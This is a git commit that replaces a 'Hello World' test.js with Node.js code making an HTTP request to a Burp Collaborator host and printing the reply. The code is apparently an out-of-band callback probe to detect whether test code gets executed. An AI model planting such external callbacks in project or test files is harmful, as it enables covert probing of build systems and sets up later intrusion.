22890a3c182bd971514869a0d040fca1ebad1885
sadathanwar17 <sadath.anwar17@gmail.com>
2021-01-03 11:49:05 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,19 @@
-console.log("Hello World");
+const http = require("http")
+
+http
+  .request(
+    {
+      hostname: "xyzfcdayokqriuzgcd8i8yzt1k7bv0.burpcollaborator.net",
+    },
+    res => {
+      let data = ""
+
+      res.on("data", d => {
+        data += d
+      })
+      res.on("end", () => {
+        console.log(data)
+      })
+    }
+  )
+  .end()
